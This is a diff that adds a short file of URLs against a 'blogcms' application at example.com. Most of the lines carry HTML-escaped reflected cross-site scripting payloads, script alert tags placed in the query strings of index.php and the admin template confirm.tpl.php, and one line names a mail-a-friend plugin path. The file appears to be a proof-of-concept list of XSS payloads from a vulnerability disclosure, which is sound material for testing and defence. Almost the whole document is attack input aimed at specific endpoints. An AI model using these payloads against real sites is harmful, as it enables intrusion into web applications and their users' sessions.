@@ -1,0 +1,7 @@
+http://www.example.com/blogcms/photo/index.php?&quot;&lt;script&gt;alert(0x0029A)&lt;/script&gt;
+http://www.example.com/blogcms/photo/index.php?&quot;&lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;
+
+http://www.example.com/blogcms/photo/templates/admin_default/confirm.tpl.php?nsextt=&quot;&lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;
+http://www.example.com/blogcms/photo/templates/admin_default/confirm.tpl.php?nsextt=&quot;&lt;script&gt;alert(0x0029A)&lt;/script&gt;
+
+http://www.example.com/blogcms/admin/plugins/mailtoafriend/mailfriend.php
